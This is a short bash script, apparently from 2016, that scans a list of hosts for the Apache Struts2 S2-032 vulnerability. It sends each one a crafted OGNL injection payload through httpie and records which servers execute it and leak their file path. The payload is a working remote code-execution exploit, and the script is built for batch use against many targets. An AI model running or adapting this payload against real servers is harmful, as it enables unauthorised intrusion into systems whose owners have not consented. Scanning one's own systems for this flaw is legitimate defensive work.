#!/usr/bin/env bash
#
# Struts2 S2-032 checking tools.
# author: 7ym0n.q6e/bb.qnyd@gmail.com
# Copyleft (C) 2016 7ym0n.q6e.  All rights reserved.
#
# Struts S2-032 is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Struts S2-032.  If not, see <http://www.gnu.org/licenses/>.
#

tools=`which http`
if [ $tools = "" ];then
	echo -e	"\033[0;31m ERROR:\thttp not found."
	echo -e "\033[0;31m Pealse install httpie tools."
	echo -e "\033[0;31m github project:\thttps://github.com/jkbrzt/httpie"
	exit 1;	
fi

if [[ "$1" = "" || "$2" = "" ]];then
	echo -e "\033[0;32m HELP:"
	echo -e "\033[0;32m 	./s2-032.sh [URLS FILE] [RESULT FILE]"
	echo -e "\033[0;32m	website url write to URLS FILE"
	echo -e "\033[0;32m Example:"
	echo -e "\033[0;32m	echo -e \"127.0.0.1:8080\\\n192.168.1.28:8080\" >> urls.txt;"
	echo -e "\033[0;32m	./s2-032.sh urls.txt out.txt"
	echo -e "\033[0;32m"
	exit 0;
fi
count=`wc -l $1`
urls=`cat $1`; 
echo "out file,clearing..."
rm -rf $2
echo "exploiting..."
n=1
for u in $urls;
do 
	echo -e "\033[0;32m[$n/$count]"
	n=$(($n+1))
	#echo $u;
	if [ "$u" != "" ];then
		rst=`http "$u?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23path%3d%23req.getRealPath%28%23parameters.pp[0]%29,%23w%3d%23res.getWriter%28%29,%23w.print%28%23path%29,1?%23xx:%23request.toString&pp=%2f7ym0n.jsp&encoding=UTF-8"`
		mach=`echo $rst | grep "7ym0n.jsp"`
		distort=`echo $rst | grep "2f7ym0n.jsp"`
		if [ "$mach" != "" ];then
			if [ "$distort" != "" ];then
				exit 1;
			fi
			echo $u $mach >> $2
		fi
	
	fi
done
echo "Done!!!"
exit 0;
